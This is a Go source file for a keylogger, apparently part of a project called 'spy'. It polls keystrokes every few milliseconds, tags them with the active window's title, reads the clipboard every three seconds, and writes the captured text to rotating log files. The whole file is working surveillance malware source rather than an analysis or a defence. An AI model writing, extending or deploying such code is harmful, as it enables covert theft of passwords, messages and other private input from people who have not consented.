package keylogger

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/atotto/clipboard"
	"github.com/cinus-e/spy/literr"
	"github.com/cinus-e/spy/system"
	"github.com/cinus-e/spy/util"
)

type Keylogger struct {
	log                         *os.File
	startTime                   time.Time
	rotateInterval              int //minutes
	isKeyLogging, isClipLogging bool
}

func NewKeylogger(rotateInterval int, isKeyLogging, isClipLogging bool) (*Keylogger, error) {
	file, err := createLogFile()
	if err != nil {
		return nil, err
	}
	return &Keylogger{
		log:            file,
		startTime:      time.Now(),
		isKeyLogging:   isKeyLogging,
		rotateInterval: rotateInterval,
		isClipLogging:  isClipLogging,
	}, nil
}

func (l *Keylogger) RunKeyboardLogger() {
	var lastText, lastKey string
	for l.isKeyLogging {
		text := system.GetWindowText(system.GetForegroundWindow())
		if text != "" && lastText != text {
			lastText = text
			l.write(fmt.Sprintf("\n%s[%s]\n", util.Now(), text))
		}
		key := getKey(capsLock(), isKeyDown(vk_SHIFT))
		if key != "" {
			if key != lastKey {
				lastKey = key
				l.write(key)
			}
		} else {
			lastKey = ""
		}
		time.Sleep(3 * time.Millisecond)
	}
	l.closeLog()
}

func (l *Keylogger) RunClipboardLogger() {
	var lastText string
	for l.isClipLogging {
		text, _ := clipboard.ReadAll()
		if text != lastText {
			l.write(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))
			lastText = text
		}
		time.Sleep(3 * time.Second)
	}
	l.closeLog()
}

func (l *Keylogger) write(text string) {
	if l.log == nil {
		return
	}
	if _, err := l.log.Write([]byte(text)); err != nil {
		literr.CheckError(err)
	}
	if time.Now().Sub(l.startTime).Minutes() > float64(l.rotateInterval) {
		file, err := createLogFile()
		if literr.CheckError(err) {
			return
		}
		l.log.Close()
		l.log = file
		l.startTime = time.Now()
	}
}

func (l *Keylogger) closeLog() {
	if l.isKeyLogging == false && l.isClipLogging == false {
		_ = l.log.Close()
		l.log = nil
	}
}

func (l *Keylogger) Close() {
	l.isKeyLogging = false
	l.isClipLogging = false
}

func createLogFile() (*os.File, error) {
	path, err := filepath.Abs(util.FileNameFormat("key", ".txt"))
	if err != nil {
		return nil, err
	}
	file, err := os.Create(path)
	if err != nil {
		return nil, err
	}
	return file, nil
}
